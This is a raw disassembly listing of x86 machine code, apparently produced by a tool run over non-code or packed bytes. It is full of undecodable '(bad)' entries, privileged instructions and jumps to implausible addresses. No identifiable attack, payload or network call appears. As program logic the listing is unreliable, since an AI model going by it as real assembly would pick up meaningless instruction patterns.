  431ad7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431add:	js     0x431a63
  431adf:	jae    0x431ae3
  431ae1:	(bad)  
  431ae3:	xor    al,0x5d
  431ae5:	jmp    0x431a72
  431ae7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431aee:	fdecstp 
  431af0:	test   BYTE PTR [edi],ah
  431af2:	add    bh,BYTE PTR [ebp+0x0]
  431af5:	add    ebx,DWORD PTR [ebp-0x77]
  431af8:	mov    edi,eax
  431afa:	cmp    al,0x0
  431afd:	adc    dh,BYTE PTR [ebx]
  431aff:	jge    0x431b04
  431b01:	mov    edi,DWORD PTR [ebx]
  431b03:	jl     0x431b14
  431b05:	clc    
  431b06:	dec    edi
  431b07:	jge    0x431b09
  431b09:	mov    eax,DWORD PTR [ebx]
  431b0b:	jb     0x431b15
  431b0d:	mov    ecx,DWORD PTR [ebp-0x8]
  431b10:	mov    edi,edi
  431b12:	xor    edx,DWORD PTR [eax]
  431b14:	add    edi,DWORD PTR [ebx]
  431b16:	mov    DWORD PTR [ebp-0x10],edi
  431b19:	inc    edi
  431b1a:	pop    ebp
  431b1b:	jge    0x431b58
  431b1d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431b21:	mov    edx,0xc05d87f0
  431b26:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431b2a:	fimul  WORD PTR [eax]
  431b2c:	fist   WORD PTR [ebp+0x1c]
  431b2f:	in     al,dx
  431b30:	jne    0x431b1e
  431b32:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431b38:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431b3c:	fdivp  st(0),st
  431b3e:	fild   WORD PTR [ebp+0x4510f85c]
  431b44:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431b4a:	inc    ebp
  431b4b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431b51:	mov    ebp,DWORD PTR [ebx-0x4]
  431b54:	adc    al,0x8b
  431b56:	rcl    DWORD PTR [eax],0x48
  431b59:	mov    esi,0x7080803
  431b5e:	fiadd  WORD PTR [ebp+0x4d]
  431b61:	(bad)  
  431b62:	mov    edx,DWORD PTR [edx-0x4]
  431b65:	mov    edx,DWORD PTR [ebp-0x4]
  431b68:	xor    ebx,DWORD PTR [ebx+0x330103]
  431b6e:	mov    DWORD PTR [edi+0x872dc],edi
  431b74:	xlat   BYTE PTR ds:[ebx]
  431b75:	into   
  431b76:	ffreep st(6)
  431b78:	retf   0x6c7
  431b7b:	iret   
  431b7c:	dec    ebp
  431b7d:	inc    ebp
  431b7e:	mov    DWORD PTR [ebx],edi
  431b80:	fmul   QWORD PTR [edi]
  431b82:	dec    ebp
  431b83:	jnp    0x431bb8
  431b85:	add    BYTE PTR [ebx],al
  431b87:	mov    ecx,DWORD PTR [esp+edi*8]
  431b8a:	inc    ebp
  431b8b:	dec    ebp
  431b8c:	lea    esi,[ebx]
  431b8e:	add    DWORD PTR [ebx],eax
  431b90:	jb     0x431bcd
  431b92:	add    BYTE PTR [edi],cl
  431b94:	inc    ebp
  431b95:	imul   eax,edi,0x858bd800
  431b9b:	cld    
  431b9c:	clc    
  431b9d:	mov    DWORD PTR [ebp+0x0],eax
  431ba0:	inc    DWORD PTR [eax]
  431ba2:	or     al,0xde
  431ba4:	sbb    bh,0x1
  431ba7:	retf   
  431ba8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431baf:	dec    ebp
  431bb0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431bb6:	enter  0x12de,0xdf
  431bba:	inc    ebp
  431bbb:	pop    ebp
  431bbc:	dec    DWORD PTR [ebx-0x257f0ff4]
  431bc2:	add    DWORD PTR [edx],edx
  431bc4:	add    BYTE PTR [ebp+0x50],dl
  431bc7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431bcd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431bd3:	or     ah,al
  431bd5:	pop    ss
  431bd6:	cdq    
  431bd7:	push   ebp
  431bd8:	clc    
  431bd9:	mov    eax,DWORD PTR [ebp-0x4]
  431bdc:	xor    edx,edx
  431bde:	add    esi,DWORD PTR [ebx]
  431be0:	cmp    eax,DWORD PTR [ebx]
  431be2:	hlt    
  431be3:	cmp    DWORD PTR [ebx],esp
  431be5:	or     al,BYTE PTR [ebp+0xf]
  431be8:	mov    eax,DWORD PTR [edx]
  431bea:	loopne 0x431bec
  431bec:	(bad)  
  431bed:	mov    ecx,esi
  431bef:	cld    
  431bf0:	pushf  
  431bf1:	pop    ebp
  431bf2:	fwait
  431bf3:	mov    esi,DWORD PTR [edx]
  431bf5:	lock mov eax,eax
  431bf8:	adc    BYTE PTR [ebx],al
  431bfa:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c01:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c07:	dec    ebp
  431c08:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431c0e:	(bad)  
  431c0f:	iret   
  431c10:	inc    ebp
  431c11:	(bad)  
  431c12:	jne    0x431c61
  431c14:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431c1a:	(bad)  
  431c1b:	cmp    ebx,eax
  431c1d:	je     0x431ba5
  431c1f:	add    edi,edi
  431c21:	or     bh,bh
  431c23:	dec    ebp
  431c24:	inc    ebp
  431c25:	mov    esi,DWORD PTR [ebx]
  431c27:	cld    
  431c28:	add    ecx,esi
  431c2a:	cmp    ecx,DWORD PTR [eax-0xc]
  431c2d:	mov    edx,DWORD PTR [edi]
  431c2f:	or     BYTE PTR [ebp-0x7c],al
  431c32:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431c38:	test   BYTE PTR [ebx+ebx*4],cl
  431c3b:	inc    ebp
  431c3c:	xor    bh,BYTE PTR [esi]
  431c3e:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431c45:	jne    0x431c0e
  431c47:	mov    ebp,esp
  431c49:	fcomp  DWORD PTR [ebx]
  431c4b:	add    BYTE PTR [ecx],al
  431c4d:	inc    DWORD PTR [ebp-0x75]
  431c50:	(bad)  
  431c51:	cld    
  431c52:	add    al,0xce
  431c54:	mov    ecx,edi
  431c56:	cld    
  431c57:	inc    ebp
  431c58:	fidivr WORD PTR [ebx]
  431c5a:	fbstp  TBYTE PTR [ebp-0x3e]
  431c5d:	mov    eax,DWORD PTR [eax]
  431c5f:	adc    BYTE PTR [ebx-0x3974038b],cl
  431c65:	fadd   st,st(7)
  431c67:	add    BYTE PTR [ebp-0x1],al
  431c6a:	mov    ecx,DWORD PTR [esp+edi*8]
  431c6d:	inc    ebp
  431c6e:	mov    bh,0xc7
  431c71:	loopne 0x431cb8
  431c73:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431c79:	sbb    dh,BYTE PTR [ebx]
  431c7b:	pushf  
  431c7c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c82:	mov    eax,edi
  431c84:	cwde   
  431c85:	inc    ebp
  431c86:	inc    ebp
  431c87:	jne    0x431c14
  431c89:	mov    esp,esp
  431c8b:	clc    
  431c8c:	add    al,0x4d
  431c8e:	mov    DWORD PTR [ebx],esi
  431c90:	or     al,0x33
  431c92:	inc    ebp
  431c93:	lea    ecx,[ebx-0x398d13fd]
  431c99:	add    bh,al
  431c9b:	inc    ebp
  431c9c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431ca3:	add    ebp,esp
  431ca5:	shufps xmm1,xmm3,0xc7
  431ca9:	(bad)  
  431caa:	jmp    0x748857d3
  431caf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431cb5:	hlt    
  431cb6:	mov    ecx,DWORD PTR [edi]
  431cb8:	fadd   DWORD PTR [ebp+0x0]
  431cbb:	xor    ecx,DWORD PTR [edi]
  431cbd:	add    ecx,ecx
  431cbf:	cmp    edi,edi
  431cc1:	pmuludq mm7,QWORD PTR [edx+0x50]
  431cc5:	(bad)  
  431cc6:	jmp    0x431c53
  431cc8:	mov    edi,esp
  431cca:	or     al,0xc6
  431ccc:	inc    ebp
  431ccd:	(bad)  
  431cce:	mov    eax,DWORD PTR [ebp+0x10]
  431cd1:	jne    0x431c5c
  431cd3:	mov    eax,DWORD PTR [ecx]
  431cd5:	clc    
  431cd6:	add    BYTE PTR [ebp-0x40],cl
  431cd9:	xor    edx,DWORD PTR [eax-0x73]
  431cdc:	jne    0x431cdf
  431cde:	push   DWORD PTR [edx+0x8]
  431ce1:	add    BYTE PTR [ebp+0x45],al
  431ce4:	mov    ebp,ecx
  431ce6:	cld    
  431ce7:	add    BYTE PTR [ebp+0x0],cl
  431cea:	xor    eax,DWORD PTR [ebp+0x3]
  431ced:	mov    DWORD PTR [ebx],edi
  431cef:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431cf5:	sub    eax,0x5d330e4d
  431cfa:	lea    esi,[ebx]
  431cfc:	add    DWORD PTR [ebx],eax
  431cfe:	jb     0x431ce9
  431d00:	add    BYTE PTR [eax],al
  431d02:	inc    ebp
  431d03:	add    bl,ch
  431d05:	inc    ebp
  431d06:	mov    esi,DWORD PTR [ebx]
  431d08:	or     al,0x3
  431d0a:	(bad)  
  431d0b:	mov    edi,eax
  431d0d:	in     al,dx
  431d0e:	scas   eax,DWORD PTR es:[edi]
  431d0f:	inc    ebp
  431d10:	mov    esi,DWORD PTR [ebx]
  431d12:	in     al,0x3
  431d14:	add    al,0x89
  431d16:	mov    ecx,DWORD PTR [eax+edi*8]
  431d19:	dec    ebp
  431d1a:	(bad)  
  431d1b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431d22:	mov    ecx,eax
  431d24:	cld    
  431d25:	push   es
  431d26:	dec    ebp
  431d27:	add    al,0x33
  431d29:	mov    DWORD PTR [ebx],eax
  431d2b:	in     al,dx
  431d2c:	cmp    DWORD PTR [ebp-0x67],eax
  431d2f:	mov    eax,DWORD PTR [ebp-0xba0068]
  431d35:	mov    edx,DWORD PTR [ebp-0x4]
  431d38:	mov    ecx,DWORD PTR [ebp-0x2c]
  431d3b:	xor    eax,DWORD PTR [ebp+0x3]
  431d3e:	cmp    DWORD PTR [ebx],0x8b32749a
  431d44:	xor    edi,esp
  431d46:	jmp    0xff771a98
  431d4b:	add    ecx,DWORD PTR [ebp-0x3f]
  431d4e:	xor    ebx,DWORD PTR [edi]
  431d50:	add    eax,ecx
  431d52:	cmp    ebx,DWORD PTR [eax]
  431d54:	mov    ecx,DWORD PTR [ebp-0x4]
  431d57:	mov    ecx,DWORD PTR [eax]
  431d59:	adc    BYTE PTR [ebp-0x80],al
  431d5c:	jmp    0x431d5f
  431d5e:	mov    eax,DWORD PTR [eax]
  431d60:	cld    
  431d61:	mov    bh,0xc6
  431d63:	push   ecx
  431d64:	(bad)  
  431d65:	jne    0x431dc5
  431d67:	dec    ecx
  431d69:	or     BYTE PTR [ecx+ebx*1],cl
  431d6c:	push   ebp
  431d6d:	inc    ebp
  431d6e:	in     al,dx
  431d6f:	add    ebp,esp
  431d71:	or     bh,al
  431d73:	dec    ebp
  431d74:	cld    
  431d75:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431d7b:	xor    DWORD PTR [edx],0x2
  431d7e:	pushf  
  431d7f:	dec    DWORD PTR [ebx+0x45510cf4]
  431d85:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d8b:	mov    edx,DWORD PTR [ecx+0xc]
  431d8e:	xor    eax,esi
  431d90:	mov    edx,0xc172c7
  431d95:	inc    ebp
  431d96:	mov    esi,DWORD PTR [ebp+0x8]
  431d99:	mov    eax,edx
  431d9b:	call   0x84c7e490
  431da0:	add    DWORD PTR [ebx-0x76bace00],ebx
  431da6:	mov    ebp,eax
  431da8:	or     BYTE PTR [eax],dl
  431daa:	jo     0x431df9
  431dac:	push   edi
  431dad:	xor    esi,DWORD PTR [ebp+0x3]
  431db0:	(bad)  
  431db1:	pmulhuw mm0,mm1
  431db4:	test   DWORD PTR [ebp-0x8],ecx
  431db7:	mov    DWORD PTR [ebp-0x67],eax
  431dba:	mov    eax,DWORD PTR [ebp-0x4]
  431dbd:	xor    edi,DWORD PTR [ebp-0x73]
  431dc0:	xor    eax,DWORD PTR [ebx]
  431dc2:	xor    esi,DWORD PTR [edx+0x3]
  431dc5:	add    BYTE PTR [ecx],bh
  431dc7:	inc    ebp
  431dc8:	(bad)  
  431dc9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431dcf:	mov    DWORD PTR [eax],0x750f0004
  431dd5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431ddb:	lock add BYTE PTR [ebp+0x0],cl
  431ddf:	mov    esi,DWORD PTR [ebp-0x18]
  431de2:	mov    ebp,edx
  431de4:	or     al,0x72
  431de6:	ja     0x431de8
  431de8:	mov    edx,esi
  431dea:	cld    
  431deb:	(bad)  
  431dee:	cli    
  431def:	mov    esi,DWORD PTR [ebp-0x4]
  431df2:	cmp    ecx,esi
  431df4:	bswap  edi
  431df6:	(bad)
  431dfa:	mov    esi,DWORD PTR [ebp-0x4]
  431dfd:	mov    esi,ecx
  431dff:	clc    
  431e00:	repnz add esi,DWORD PTR [ebp+0x45]
  431e04:	push   ebx
  431e05:	xor    eax,DWORD PTR [ebp+0x3]
  431e08:	cmp    al,0x5f
  431e0a:	pushf  
  431e0b:	pop    ebx
  431e0c:	jmp    0x431ed3
  431e11:	mov    esi,DWORD PTR [ebp-0x7d]
  431e14:	xor    ebp,DWORD PTR [eax]
  431e16:	lea    eax,[ebp-0x8]
  431e19:	xor    edx,esi
  431e1b:	pushf  
  431e1c:	out    dx,eax
  431e1d:	(bad)  
  431e1e:	neg    eax
  431e20:	ins    DWORD PTR es:[edi],dx
  431e21:	test   esi,edi
  431e23:	clc    
  431e24:	pop    esp
  431e25:	inc    ebp
  431e26:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431e2c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431e32:	add    cl,al
  431e34:	jne    0x431dd1
  431e36:	mov    esi,DWORD PTR [edx]
  431e38:	in     al,dx
  431e39:	push   esi
  431e3a:	xor    BYTE PTR [ebp-0xe],dh
  431e3d:	add    edi,esi
  431e3f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431e45:	add    cl,bh
  431e47:	mov    edi,DWORD PTR [ebp+0x8]
  431e4a:	mov    DWORD PTR [ebp-0x14],esi
  431e4d:	add    esi,DWORD PTR [ebp+0x3c]
  431e50:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431e56:	mov    ah,0x3e
  431e58:	fwait
  431e59:	pushf  
  431e5a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431e60:	jne    0x431ded
  431e62:	mov    ecx,DWORD PTR [esp+ebp*8]
  431e65:	icebp  
  431e66:	icebp  
  431e67:	shl    edx,0xf2
  431e6a:	(bad)  
  431e6b:	mov    ah,0x16
  431e6d:	push   eax
  431e6e:	jne    0x431e03
  431e70:	mov    ecx,DWORD PTR [edi]
  431e72:	in     al,dx
  431e73:	jmp    0x431e66
  431e75:	add    dl,dh
  431e77:	mov    edi,esi
  431e79:	or     al,0x8
  431e7b:	inc    ebp
  431e7c:	jne    0x431e81
  431e7e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e84:	ret    
  431e85:	or     bh,bh
  431e87:	jge    0x431e71
  431e89:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e8f:	xor    edi,eax
  431e91:	add    esi,DWORD PTR [ebp-0x77]
  431e94:	mov    ebx,esp
  431e96:	clc    
  431e97:	neg    DWORD PTR [ebp-0x7c]
  431e9a:	xor    eax,DWORD PTR [eax]
  431e9c:	cmp    eax,DWORD PTR [eax]
  431e9e:	repz jne 0x431e36
  431ea1:	xor    eax,DWORD PTR [ecx]
  431ea3:	add    ebx,DWORD PTR [eax]
  431ea5:	mov    DWORD PTR [ebp-0x8],eax
  431ea8:	mov    eax,edi
  431eaa:	cld    
  431eab:	lock pop eax
  431ead:	test   DWORD PTR [ebx],esi
  431eaf:	clc    
  431eb0:	add    edx,DWORD PTR [edi-0x740bff77]
  431eb6:	fdivp  st(4),st
  431eb8:	test   ecx,esi
  431eba:	(bad)  
  431ebb:	jnp    0x431ebc
  431ebd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431ec3:	jae    0x431e50
  431ec5:	sub    edi,esp
  431ec7:	(bad)  
  431ec8:	shl    DWORD PTR [eax-0x3e],0x89
  431ecc:	leave  
  431ecd:	call   0x8198d5da
  431ed2:	in     al,dx
  431ed3:	(bad)  
  431ed4:	in     al,dx
  431ed5:	add    bh,al
  431ed7:	mov    esp,edi
  431ed9:	in     al,dx
  431eda:	test   DWORD PTR [ebp-0x8],edi
  431edd:	mov    eax,DWORD PTR [ebp+0x2b]
  431ee0:	xor    al,BYTE PTR [ebx]
  431ee2:	pushf  
  431ee3:	jnp    0x57321b1c
  431ee9:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431eed:	loopne 0x431f22
  431eef:	jne    0x431eac
  431ef1:	mov    esi,DWORD PTR [edx-0x20]
  431ef4:	add    BYTE PTR [ebp-0x3d],bh
  431ef7:	xor    eax,DWORD PTR [ebp-0x73]
  431efa:	mov    edi,DWORD PTR [esi]
  431efc:	cld    
  431efd:	jb     0x431ec5
  431eff:	add    bl,al
  431f01:	jne    0x431f48
  431f03:	mov    edx,DWORD PTR [edi-0x10]
  431f06:	jge    0x431f85
  431f08:	mov    esi,DWORD PTR [ebx]
  431f0a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431f0e:	xor    esi,DWORD PTR [ebp-0x77]
  431f11:	mov    esi,eax
  431f13:	lock inc ebp
  431f15:	jge    0x431f48
  431f17:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431f1e:	dec    ebp
  431f1f:	mov    esi,DWORD PTR [ebx]
  431f21:	loopne 0x431eac
  431f23:	jge    0x431f1d
  431f25:	add    DWORD PTR [ebp-0x7d],eax
  431f28:	icebp  
  431f29:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431f30:	dec    ebp
  431f31:	hlt    
  431f32:	xor    ebx,DWORD PTR [ebp-0x77]
  431f35:	mov    esi,esp
  431f37:	in     al,0x45
  431f39:	jge    0x431f78
  431f3b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431f42:	dec    ebp
  431f43:	push   esp
  431f44:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431f4a:	inc    ebp
  431f4b:	hlt    
  431f4c:	xor    DWORD PTR [ebp-0x61],esi
  431f4f:	mov    edi,DWORD PTR [eax+0xf19504]
  431f55:	repnz mov DWORD PTR [ebp+0x20],ebx
  431f59:	cmp    eax,DWORD PTR [ebp+0xf]
  431f5c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431f60:	fistp  WORD PTR [ebx+0x0]
  431f63:	inc    ebp
  431f64:	mov    ebx,DWORD PTR [edi+0xc]
  431f67:	add    eax,eax
  431f69:	inc    ebp
  431f6a:	test   BYTE PTR [ebx],dh
  431f6c:	add    eax,DWORD PTR [ebx]
  431f6e:	add    BYTE PTR [esi+0x45],bl
  431f71:	ret    0x85
  431f74:	jnp    0x5443a343
  431f7a:	inc    bp
  431f7c:	inc    ebp
  431f7d:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f83:	fdiv   QWORD PTR [ebx]
  431f85:	test   DWORD PTR [ecx+0x453bf8],edi
  431f8b:	push   ebx
  431f8c:	add    edi,DWORD PTR [esi+0x708088b]
  431f92:	cmp    esi,eax
  431f94:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f9b:	mov    esp,edi
  431f9d:	call   0x33ce64ef
  431fa2:	or     BYTE PTR [ebx],al
  431fa4:	inc    ecx
  431fa5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431fab:	and    BYTE PTR [ebp-0x7074f0bb],al
  431fb1:	lock add cl,al
  431fb4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431fbb:	mov    ch,0x45
  431fbd:	clc    
  431fbe:	xor    eax,DWORD PTR [ebp+0x3]
  431fc1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431fc7:	inc    ebp
  431fc8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431fce:	mov    edi,eax
  431fd0:	mov    eax,DWORD PTR [ebp+0x3c]
  431fd3:	mov    ecx,DWORD PTR [eax]
  431fd5:	hlt    
  431fd6:	inc    ebp
  431fd7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431fde:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431fe4:	push   ebp
  431fe5:	mov    edi,DWORD PTR [ebx]
  431fe7:	in     al,dx
  431fe8:	jne    0x431fab
  431fea:	mov    eax,DWORD PTR [ebp-0x28]
  431fed:	add    DWORD PTR [eax],0xe8058dec
  431ff3:	clc    
  431ff4:	mov    esi,DWORD PTR [edi-0x8]
  431ff7:	add    dh,dl
  431ff9:	rol    WORD PTR [ebp-0x1],cl
  431ffd:	mov    edx,DWORD PTR [eax+0x8]
  432000:	jne    0x431fc2
  432002:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432009:	inc    ebp
  43200a:	push   esp
  43200b:	test   DWORD PTR [ecx+0xf],ecx
  43200e:	sub    edx,esp
  432010:	add    eax,DWORD PTR [eax]
  432012:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432018:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43201f:	mov    eax,DWORD PTR [ecx]
  432021:	and    BYTE PTR [eax],al
  432023:	cmp    al,0x10
  432025:	add    BYTE PTR [ebp+0x66],al
  432028:	inc    ecx
  43202a:	push   esp
  43202b:	add    dh,BYTE PTR [ebp+0x0]
  43202e:	push   edx
  43202f:	enterw 0xc1,0x4d
  432034:	mov    esp,DWORD PTR [esi+0x20]
  432037:	add    DWORD PTR [ecx-0x7b],eax
  43203a:	add    eax,DWORD PTR [ebx]
  43203c:	str    WORD PTR [eax+0x45]
  432040:	lea    ecx,[ebx+0x45890801]
  432046:	sbb    BYTE PTR [ebx],al
  432048:	dec    ebp
  432049:	cmp    al,0xf
  43204b:	inc    ebp
  43204c:	push   eax
  43204d:	mov    esi,DWORD PTR [ebx]
  43204f:	push   eax
  432050:	add    eax,eax
  432052:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432059:	inc    ebp
  43205a:	add    BYTE PTR [ecx],dh
  43205c:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432063:	(bad)  
  432064:	mov    ebx,eax
  432066:	loopne 0x4320ad
  432068:	dec    ebp
  432069:	mov    ecx,DWORD PTR [edi]
  43206b:	cld    
  43206c:	push   eax
  43206d:	xchg   DWORD PTR [ebx],esi
  43206f:	add    DWORD PTR [ebx],ebp
  432071:	add    BYTE PTR [ebx],ch
  432073:	or     BYTE PTR [ecx],bh
  432075:	dec    ecx
  432076:	loopne 0x43207b
  432078:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  43207e:	push   ebp
  43207f:	add    DWORD PTR [ebx+0x55100800],eax
  432085:	dec    ebp
  432086:	jmp    0x432011
  432088:	mov    esp,DWORD PTR [eax]
  43208a:	sbb    dl,dl
  43208c:	inc    eax
  43208d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432093:	add    BYTE PTR [ebx+0x74528555],cl
  432099:	push   ebp
  43209a:	div    DWORD PTR [ebx]
  43209c:	and    eax,DWORD PTR [ebx]
  43209e:	add    edx,DWORD PTR [edx-0x30]
  4320a1:	jno    0x43202e
  4320a3:	inc    DWORD PTR [eax+eiz*1]
  4320a6:	inc    ebp
  4320a7:	push   eax
  4320a8:	push   eax
  4320a9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4320af:	mov    edi,esp
  4320b1:	push   eax
  4320b2:	inc    ebp
  4320b3:	enter  0x458b,0x8
  4320b7:	push   ecx
  4320b8:	(bad)  
  4320b9:	call   0x10d2a91
  4320be:	pop    ss
  4320bf:	push   ebp
  4320c0:	mov    ecx,DWORD PTR [ebx+0x489408]
  4320c6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4320cc:	push   ecx
  4320cd:	jo     0x4320b7
  4320cf:	inc    DWORD PTR [edi]
  4320d1:	or     BYTE PTR [eax],al
  4320d3:	call   0xce281d
  4320d8:	fmul   QWORD PTR [ebp+0x55]
  4320db:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4320e1:	mov    bh,0x8c
  4320e3:	adc    al,0x9b
  4320e5:	dec    esp
  4320e6:	xor    bl,BYTE PTR [eax]
  4320e8:	mov    ecx,DWORD PTR [ebp+0xc]
  4320eb:	mov    eax,DWORD PTR [ebp-0x4]
  4320ee:	mov    esi,DWORD PTR [edi-0x3148f924]
  4320f4:	push   es
  4320f5:	retf   
  4320f6:	mov    BYTE PTR [ebp-0x30],0x3b
  4320fa:	inc    ebp
  4320fb:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432102:	retf   0x83fc
  432105:	into   
  432106:	dec    ebp
  432107:	retf   
  432108:	mov    ecx,DWORD PTR [ebp-0x74]
  43210b:	mov    eax,DWORD PTR [eax]
  43210d:	fdiv   QWORD PTR [ebx]
  43210f:	mov    bh,0x3
  432111:	push   es
  432112:	mov    esi,ecx
  432114:	sbb    cl,dl
  432116:	dec    ebp
  432117:	sar    DWORD PTR [ebx],cl
  432119:	push   ebp
  43211a:	jne    0x43212b
  43211c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432122:	lea    ebx,[eax]
  432124:	call   0xf4ccaceb
  432129:	sbb    dh,dl
  43212b:	add    edx,ebx
  43212d:	push   ebp
  43212e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432134:	push   ecx
  432135:	mov    DWORD PTR [eax-0x30],edx
  432138:	test   DWORD PTR [edx],eax
  43213a:	xadd   esp,esi
  43213d:	pop    es
  43213e:	add    cl,dl
  432140:	mov    eax,ecx
  432142:	or     al,0x45
  432144:	(bad)  
  432145:	push   eax
  432146:	add    DWORD PTR [edx+0x0],eax
  432149:	add    ecx,DWORD PTR [ecx]
  43214b:	and    dh,cl
  43214d:	call   0xc72a1d
  432152:	add    DWORD PTR [ebp+0x0],edx
  432155:	mov    esp,DWORD PTR [ebp+0x18]
  432158:	add    BYTE PTR [eax+0x50],cl
  43215b:	xor    eax,DWORD PTR [eax]
  43215d:	add    esp,DWORD PTR [esi+0x3b]
  432160:	inc    ebp
  432161:	je     0x4320e6
  432163:	push   ecx
  432164:	dec    BYTE PTR [ebp-0x77]
  432167:	add    eax,esi
  432169:	or     al,0x5e
  43216b:	inc    eax
  43216c:	add    BYTE PTR [ebx],al
  43216e:	data16 and BYTE PTR [ebp+0x50],al
  432172:	sub    DWORD PTR [ecx],0xfffffff8
  432175:	add    BYTE PTR [ebp-0x75],ah
  432178:	add    BYTE PTR [eax],bl
  43217a:	enter  0x894d,0x8b
  43217e:	int3   
  43217f:	loopne 0x432143
  432181:	rol    BYTE PTR [eax],0x33
  432184:	lea    cx,[ebp+0xa]
  432188:	data16 jb 0x4321d0
  43218b:	add    BYTE PTR [ebx+0x44890855],cl
  432191:	sbb    ah,al
  432193:	inc    ebp
  432194:	cmp    al,0xf
  432196:	add    BYTE PTR [edx+0x66],dl
  432199:	xor    ecx,DWORD PTR [eax]
  43219b:	sub    eax,DWORD PTR [edx]
  43219d:	mov    eax,DWORD PTR [eax]
  43219f:	or     al,0x66
  4321a1:	ror    edx,cl
  4321a3:	dec    ebp
  4321a4:	inc    ebp
  4321a5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4321ab:	cld    
  4321ac:	or     BYTE PTR [edi+0x4501dd],dl
  4321b2:	ret    0xecce
  4321b5:	retf   
  4321b6:	(bad)  
  4321b7:	dec    ebp
  4321b8:	mov    al,0x8b
  4321ba:	loopne 0x4321dc
  4321bc:	cmp    ecx,DWORD PTR [edx]
  4321be:	inc    ebp
  4321bf:	daa    
  4321c0:	loopne 0x432149
  4321c2:	in     al,dx
  4321c3:	add    edi,eax
  4321c5:	add    BYTE PTR [eax+0x3f52e155],bh
  4321cb:	push   ebp
  4321cc:	inc    ebp
  4321cd:	xor    ebx,edx
  4321cf:	add    ebp,esp
  4321d1:	push   edx
  4321d2:	push   bp
  4321d4:	inc    ebp
  4321d5:	(bad)  
  4321d6:	in     eax,dx
  4321d7:	push   esp
  4321d8:	(bad)  
  4321d9:	inc    edx
  4321db:	sbb    al,0x33
  4321dd:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4321e4:	add    BYTE PTR [ebp+0x46],0x8b
  4321e8:	jmp    0xf98b:0x100041c8
  4321ef:	xor    esi,DWORD PTR [edx+0x3]
  4321f2:	mov    ecx,DWORD PTR [edi]
  4321f4:	fmul   DWORD PTR [edx]
  4321f6:	add    BYTE PTR [eax],al
  4321f8:	lea    eax,[ebx-0x4700273c]
  4321fe:	add    al,0x4f
  432200:	pop    DWORD PTR [eax]
  432202:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432208:	push   edx
  432209:	inc    WORD PTR [ebp+0x8]
  43220d:	mov    eax,0x514f4d
  432212:	(bad)
  432216:	add    al,al
  432218:	xor    DWORD PTR [ebx-0x74baf730],eax
  43221e:	test   DWORD PTR [esi+0x74],esp
  432221:	inc    ebp
  432222:	mov    DWORD PTR [eax+0xa4e08],edi
  432228:	add    BYTE PTR [ecx-0x76c435bb],cl
  43222e:	or     dh,cl
  432230:	or     eax,0x8b8d5045
  432235:	inc    ebp
  432236:	mov    WORD PTR [ecx+0x3b8a00],?
  43223c:	jne    0x432271
  43223e:	mov    edi,DWORD PTR [edx+0x8f3b18]
